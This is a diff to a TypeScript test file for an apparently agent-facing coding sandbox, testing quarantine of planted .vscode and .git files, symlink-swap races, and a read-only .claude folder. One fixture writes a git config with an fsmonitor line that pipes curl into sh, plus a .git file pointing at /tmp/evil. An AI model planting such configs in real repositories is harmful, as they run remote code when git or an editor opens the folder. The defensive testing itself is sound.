@@ -18,6 +18,7 @@ import { Type } from "@sinclair/typebox";
 import { afterEach, beforeEach, describe, expect, it } from "vitest";
 import {
   type AgentToolRegistration,
+  CodingSandboxes,
   codingTools,
   defineTool,
   keepQuarantined,
@@ -240,8 +241,8 @@ describe("code.run and launch config", () => {
     expect(fresh.reports[0]?.quarantined).toEqual([".claude"]);
   });
 
-  // #1435 review r1, item 3: a folder swapped for a link between the check and the move.
-  it("never moves something of the owner's in through a swapped folder", async () => {
+  // #1435 reviews r1 and r2, item 3: a folder swapped for a link between the check and the move.
+  it("holds what came through a swapped folder, with an incident record, and never moves it back", async () => {
     const other = join(dir, "OtherProject");
     mkdirSync(join(other, ".vscode"), { recursive: true });
     writeFileSync(join(other, ".vscode", "settings.json"), "owner's");
@@ -268,29 +269,103 @@ describe("code.run and launch config", () => {
     acts(runner, "plant", () => put("sub/.vscode/tasks.json", "{}"));
     await use("code.open", { path: repo });
     await use("code.run", { root: repo, argv: ["plant"] });
-    expect(readFileSync(join(other, ".vscode", "settings.json"), "utf8")).toBe("owner's");
-    expect(reports[0]?.unmoved).toEqual(["sub/.vscode"]);
-    expect(reports[0]?.quarantined).toEqual([]);
+    const report = reports[0] as LaunchConfigReport;
+    expect(report.incidents).toEqual(["sub/.vscode"]);
+    // Held in the quarantine, not moved anywhere the swapped path points at next.
+    const held = join(quarantine, report.quarantineId as string);
+    expect(readFileSync(join(held, "entries/sub/.vscode/settings.json"), "utf8")).toBe("owner's");
+    const record = JSON.parse(readFileSync(join(held, "record.json"), "utf8")) as {
+      entries: string[];
+      incidents: { rel: string; dev: string; ino: string; at: string }[];
+    };
+    expect(record.entries).toEqual(["sub/.vscode"]);
+    expect(record.incidents[0]).toMatchObject({ rel: "sub/.vscode" });
+    expect(record.incidents[0]?.ino).toMatch(/^[0-9]+$/);
   });
 
-  it("Keep it never puts an entry back through a swapped folder", async () => {
+  it("Keep it stops the sandbox first, and says loudly when a folder was swapped anyway", async () => {
     const { use, runner, reports } = setup();
     acts(runner, "plant", () => put("sub/.vscode/tasks.json", "{}"));
     await use("code.open", { path: repo });
     await use("code.run", { root: repo, argv: ["plant"] });
     const id = reports[0]?.quarantineId as string;
+    const order: string[] = [];
     const other = join(dir, "OtherProject");
     mkdirSync(other);
     await expect(
       keepQuarantined(quarantine, id, {
+        beforeKeep: (root) => {
+          order.push(`stop ${root}`);
+        },
         beforeMove: () => {
+          order.push("move");
           renameSync(join(repo, "sub"), join(repo, "sub-was"));
           symlinkSync(other, join(repo, "sub"));
         },
       }),
-    ).rejects.toMatchObject({ code: "conflict" });
-    expect(existsSync(join(other, ".vscode"))).toBe(false);
-    expect(existsSync(join(quarantine, id, "entries", "sub/.vscode/tasks.json"))).toBe(true);
+    ).rejects.toMatchObject({ code: "conflict", details: { reason: "keep_folder_swapped" } });
+    expect(order).toEqual([`stop ${repo}`, "move"]);
+  });
+
+  it("notes each repository's sandboxes, so Keep it can stop them", async () => {
+    const sandboxes = new CodingSandboxes();
+    const runner = new FakeSandboxRunner();
+    const tools = codingTools({
+      files: fileTools(),
+      folders: () => [{ path: dir, mode: "rw" }],
+      runner,
+      launchConfig: { quarantineDir: quarantine, sandboxes },
+    });
+    const byName = new Map(tools.map((t) => [t.spec.name, t]));
+    await byName.get("code.open")?.run?.({ path: repo }, ctx());
+    await byName.get("code.run")?.run?.({ root: repo, argv: ["true"] }, ctx());
+    expect(sandboxes.take(repo)).toEqual([runner.execs[0]?.sandboxId]);
+    expect(sandboxes.take(repo)).toEqual([]);
+  });
+
+  // #1435 review r2, B1: a repository the run made, which VS Code finds and runs git in.
+  it("holds what git runs from in a .git the run made, and keeps the clone's history", async () => {
+    const fsmonitor = "[core]\n\tfsmonitor = sh -c 'curl x | sh'\n";
+    const { use, runner, reports } = setup();
+    acts(runner, "clone", () => {
+      put("tools/x/.git/config", fsmonitor);
+      put("tools/x/.git/hooks/post-checkout", "#!/bin/sh\n");
+      put("tools/x/.git/objects/ab/cdef", "x");
+      put("tools/x/.git/HEAD", "ref: refs/heads/main\n");
+      // Build output is never walked, but its repositories are looked for.
+      put("build/.git/config", fsmonitor);
+      put("build/.git/HEAD", "ref: refs/heads/main\n");
+      put("dist/web/.git/config", fsmonitor);
+      // A `.git` file pointing elsewhere.
+      put("lib/y/.git", "gitdir: /tmp/evil\n");
+    });
+    await use("code.open", { path: repo });
+    await use("code.run", { root: repo, argv: ["clone"] });
+    expect([...(reports[0]?.quarantined ?? [])].sort()).toEqual([
+      "build/.git/config",
+      "dist/web/.git/config",
+      "lib/y/.git",
+      "tools/x/.git/config",
+      "tools/x/.git/hooks",
+    ]);
+    expect(existsSync(join(repo, "tools/x/.git/config"))).toBe(false);
+    expect(existsSync(join(repo, "tools/x/.git/objects/ab/cdef"))).toBe(true);
+    expect(existsSync(join(repo, "build/.git/HEAD"))).toBe(true);
+  });
+
+  it("says .claude is read-only during code.run when a write there failed", async () => {
+    put(".claude/settings.json", "{}");
+    const { use, runner } = setup();
+    runner.script(["sh"], {
+      exitCode: 1,
+      stderr: "sh: can't create /workspace/repo/.claude/skills/x.md: Read-only file system\n",
+    });
+    await use("code.open", { path: repo });
+    const r = await use("code.run", {
+      root: repo,
+      argv: ["sh", "-c", "echo > .claude/skills/x.md"],
+    });
+    expect(r.output.readOnlyHint).toMatch(/`\.claude`.*read-only during code\.run.*code\.edit/);
   });
 
   // #1435 review r1, items 4 and 5.
